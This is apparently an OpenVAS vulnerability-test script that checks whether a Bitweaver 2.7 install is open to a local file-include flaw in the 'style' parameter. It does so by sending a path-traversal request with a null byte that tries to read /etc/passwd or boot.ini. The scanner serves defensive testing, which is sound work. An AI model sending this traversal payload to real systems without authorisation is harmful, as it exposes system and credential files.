###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bitweaver_41301.nasl 6705 2017-07-12 14:25:59Z cfischer $
#
# Bitweaver 'style' Parameter Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Bitweaver is prone to a local file-include vulnerability because it
fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and to execute arbitrary local scripts in
the context of the webserver process. This may allow the attacker
to compromise the application and the computer; other attacks are
also possible.

Bitweaver 2.7 is vulnerable; other versions may also be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.100713";
CPE = "cpe:/a:bitweaver:bitweaver";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version("$Revision: 6705 $");
 script_tag(name:"last_modification", value:"$Date: 2017-07-12 16:25:59 +0200 (Wed, 12 Jul 2017) $");
 script_tag(name:"creation_date", value:"2010-07-13 12:45:31 +0200 (Tue, 13 Jul 2010)");
 script_bugtraq_id(41301);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_name("Bitweaver 'style' Parameter Local File Include Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/41301");
 script_xref(name : "URL" , value : "http://www.bitweaver.org/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("secpod_bitweaver_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("Bitweaver/installed");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");

foreach file (keys(files)) {

  url = string(dir, "/wiki/rankings.php?style=../../../../../../../../../../../../",files[file],"%00"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);
